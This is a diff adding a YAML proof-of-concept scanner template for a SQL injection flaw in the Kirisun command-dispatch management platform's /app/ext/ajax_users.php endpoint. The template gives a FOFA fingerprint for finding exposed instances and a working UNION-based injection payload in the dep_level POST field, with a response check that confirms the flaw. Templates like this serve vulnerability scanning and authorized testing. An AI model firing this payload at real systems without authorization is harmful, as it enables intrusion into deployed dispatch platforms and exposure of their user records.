@@ -1,0 +1,30 @@
+id: poc-yaml-kirisun-ajax-users-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /app/ext/ajax_users.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5({{.t1}}),0x7e),NULL,NULL,NULL--
+    -
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"usr_uuid\"") &&
+
+    contains(body,"\"usr_number\"") &&
+
+    contains(body,t2) &&
+
+    !contains(body,"<")
+
+    '
+transport: http
